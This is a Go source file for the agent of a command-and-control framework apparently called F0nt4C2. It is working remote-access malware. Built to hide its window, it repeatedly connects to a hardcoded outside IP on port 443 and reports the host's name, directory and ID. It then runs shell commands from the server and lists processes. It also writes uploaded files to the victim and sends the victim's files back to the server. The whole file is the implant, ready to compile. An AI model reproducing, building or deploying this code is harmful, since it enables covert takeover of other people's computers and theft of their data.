// Compile with
// => GOOS=windows | $Env:GOOS = 'windows' | export GOOS=windows
// => GOOS=linux | $Env:GOOS = 'linux' | export GOOS=linux
// => go build -ldflags -H=windowsgui agent.go
// > this will hide the cmd window

package main

import (
	"F0nt4C2/utils/functions"
	utils "F0nt4C2/utils/structures"
	"crypto/md5"
	"encoding/gob"
	"encoding/hex"
	"flag"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"time"

	ps "github.com/mitchellh/go-ps"
)

var (
	message utils.Message
	RHOST   string = "200.98.160.80"
	RPORT   string = "443"
)

func init() {

	// Handle the flags
	handleFlags()

	// Fill the Message object
	message.AgentHostname, _ = os.Hostname()
	message.AgentPWD, _ = os.Getwd()
	message.AgentId = generateId()

}

func main() {

	// Loop the connection with the server

	for {

		// Make a connection to the server
		chanel, err := net.Dial("tcp", RHOST+":"+RPORT)

		// If the is any error to connection, try again in 5 seconds
		if err != nil {
			fmt.Println("[-] Trying to connect...")
			time.Sleep(time.Duration(5) * time.Second)
			continue
		}

		defer chanel.Close()

		// Send a package of information (message) to the server on the chanel that was created
		gob.NewEncoder(chanel).Encode(message)

		// Clear the commands after send to server
		message.Commands = []utils.Command{}

		// Receive message from the server throught the chanel and populate the message
		gob.NewDecoder(chanel).Decode(&message) // make a reference to the object that already exists (&)

		// validate if there is any command on the message received from the server
		if validateCommandsInMessage(message) {

			for i, command := range message.Commands {

				message.Commands[i].Response = executeCommand(command, i)

			}

		}

		// Wait time on each new communication
		// Generate a random timer between 3 and 7 seconds
		waitTime := rand.Intn(7-3) + 3

		time.Sleep(time.Duration(waitTime) * time.Second)
	}

}

func handleFlags() {
	flag.StringVar(&RHOST, "RHOST", "200.98.160.80", "a string") //200.98.160.80
	flag.StringVar(&RPORT, "RPORT", "443", "a string")

	flag.Parse()
}

func generateId() string {

	// Get hostname and time to generate a unique hash for ID
	hostname, _ := os.Hostname()
	time := time.Now().String()

	hash := md5.New()

	hash.Write([]byte(hostname + time))

	return hex.EncodeToString(hash.Sum(nil))

}

func validateCommandsInMessage(messageServer utils.Message) bool {

	if len(messageServer.Commands) > 0 {
		return true
	}

	return false

}

func executeCommand(commandObj utils.Command, index int) (response string) {

	command := commandObj.Command

	command = functions.TreatCommand(command)

	// separate the command and remove any '\n' from it
	separatedCommand := functions.SplitCommand(command)
	baseCommand := separatedCommand[0]

	switch baseCommand {
	// ls, whoami, dir, tasklist
	case "ls":
		response = listDirectory()

	case "pwd":
		response, _ = os.Getwd()

	case "cd":
		if len(separatedCommand) > 0 {

			response = changeDirectory(separatedCommand[1])

		} else {
			response = "[-] Please insert a directory!"
		}

		return response

	case "whoami":
		response = whoami()

	case "ps":
		response = listProcesses()

	case "upload":
		response = uploadFile(commandObj)

	case "download":
		response = downloadFile(commandObj, index)

	default:
		response = executeShellCommand(command)

	}

	return response

}

func listDirectory() string {

	currentDirectory, _ := os.Getwd()

	files, _ := ioutil.ReadDir(currentDirectory)

	directoryList := ""

	for _, file := range files {

		fileType := "-"

		if file.IsDir() == true {
			fileType = "d"
		}

		fileSize := strconv.FormatInt(file.Size(), 10)
		directoryList = directoryList + fileType + "  " + file.Mode().Perm().String() + "  " + fileSize + "  " + file.Name() + "\n"
	}

	return directoryList

}

func changeDirectory(newDirectory string) string {

	err := os.Chdir(newDirectory)

	response := "[+] Directory changed successfully."

	if err != nil {
		response = "[-] Error to change directory!"
	} else {
		// If it was successeful, change the directory on the messaage struct
		message.AgentPWD, _ = os.Getwd()
	}

	return response
}

func whoami() string {

	user, _ := user.Current()
	username := user.Username

	return username

}

func listProcesses() string {

	processesList, _ := ps.Processes()

	processes := "PPid -> Pid -> Executable"

	for _, process := range processesList {
		processPPid := process.PPid() // Parent Pid (who have called the processes)
		processPid := process.Pid()
		processExecutable := process.Executable()
		processes += fmt.Sprintf("%d -> %d -> %s\n", processPPid, processPid, processExecutable)
	}

	return processes

}

func executeShellCommand(command string) string {

	response := ""
	executor := ""

	if runtime.GOOS == "windows" {

		executor = "cmd.exe"

	} else {

		executor = "/bin/bash"

	}

	// Execute cmd command and return bytes
	cmd := exec.Command(executor, "/c", command)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	output, _ := cmd.Output()

	// transform bytes into string
	response = string(output)

	return response

}

func uploadFile(commandObj utils.Command) string {

	response := ""

	file := commandObj.File

	err := os.WriteFile(file.Name, file.Content, 0644)

	if err != nil {
		response = "[-] Error to upload file on the target: " + err.Error()
	} else {

		currentDir, _ := os.Getwd()

		fullFileDir := filepath.FromSlash(filepath.Join(currentDir, file.Name))

		response = "[+] File uploaded successfully: " + fullFileDir

	}

	return response
}

func downloadFile(commandObj utils.Command, index int) string {

	response := ""

	var err error

	// Fullfil the command with the content of the file
	message.Commands[index].File.Content, err = os.ReadFile(commandObj.File.Name)

	if err != nil {
		response = "[-] Error to open the file " + err.Error()
	} else {
		response = "[+] File extracted successfully from target."
	}

	return response

}
